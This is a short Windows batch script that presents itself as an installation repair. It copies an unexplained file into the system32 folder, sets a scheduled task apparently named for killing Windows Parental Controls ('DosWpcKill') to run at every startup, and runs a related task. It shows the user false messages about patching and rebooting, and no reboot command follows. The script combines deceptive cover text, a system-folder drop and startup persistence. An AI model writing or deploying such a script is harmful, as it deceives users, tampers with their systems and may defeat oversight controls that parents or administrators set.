echo repair the installation
powershell sleep 1
cd "\Program Files"\copyrepair\
copy 1_2_4 c:\windows\system32
echo The program need to restart the computer for re-apply the patch
pause
echo rebooting...
schtasks /change /tn "drivers\DosWpcKill-dosexec" /sc onstart
SCHTASKS /RUN /TN "drivers\DosWpcKill-msdos"
